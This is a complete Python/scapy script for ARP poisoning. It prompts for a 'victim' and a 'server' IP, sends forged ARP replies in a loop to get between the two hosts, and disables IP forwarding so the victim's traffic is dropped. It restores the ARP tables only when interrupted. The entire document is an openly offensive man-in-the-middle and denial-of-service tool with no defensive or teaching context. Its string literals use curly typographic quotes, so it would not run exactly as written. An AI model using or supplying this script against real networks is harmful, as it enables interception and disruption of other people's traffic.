#! /usr/bin/python

from scapy.all import *
import sys 
import os 
import time

try:
	intface = raw_input(“Enter Desired Interface: ”)
	vIP = raw_input(“Enter Victim IP: ”)
	gIP = raw_input(“Enter Server IP: ”)
except KeyboardInterrupt:
	print (“\nKeyboard Interrupt”)
	print (“Exiting…”)
	sys.exit(1)
print (“\nDisabling IP Forwarding…\n”)
os.system(“echo 0 > /proc/sys/net/ipv4/ip_forward”)

def getmac(IP):
	conf.verb = 0
	ans, unans = srp(Ether(dst = “ff:ff:ff:ff:ff:ff”)/ARP(pdst = IP), \
	timeout = 2, iface= intface, inter = 0.1)
	for snd, rcv in ans:
		return rcv.sprintf(r”%Ether.src%”)

def reARP():
	print (“\nRestoring Targets…”)
	vMAC = getmac(vIP)
	gMAC = getmac(gIP)
	send(ARP(op = 2, pdst = gIP, psrc = vIP, hwdst = “ff:ff:ff:ff:ff:ff”, hwsrc = vMAC), \
	count = 10)
	send(ARP(op = 2, pdst = vIP, psrc = gIP, hwdst = “ff:ff:ff:ff:ff:ff”, hwsrc = gMAC), \
	count = 10)

def trick(gm, vm):
	send(ARP(op = 2, pdst = vIP, psrc = gIP, hwdst = vm))
	send(ARP(op = 2, pdst = gIP, psrc = vIP, hwdst = gm))

def MITM():
	try:
		vMAC = getmac(vIP)
	except Exception:
		os.system(“echo 0 > /proc/sys/net/ipv4/ip_forward”)
		print (“Couldn’t Find Victim MAC Address”)
		print (“Exiting…”)
		sys.exit(1)
	try:
		gMAC = getmac(gIP)
	except Exception:
		os.system(“echo 0 > /proc/sys/net/ipv4/ip_forward”)
		print (“Couldn’t Find Server MAC Address”)
		print (“Exiting…”)
		sys.exit(1)
	print (“Poisoning Targets…”)
	while 1:
		try:
			trick(gMAC, vMAC)
			time.sleep(1.5)
		except KeyboardInterrupt:
			reARP()
			break
MITM()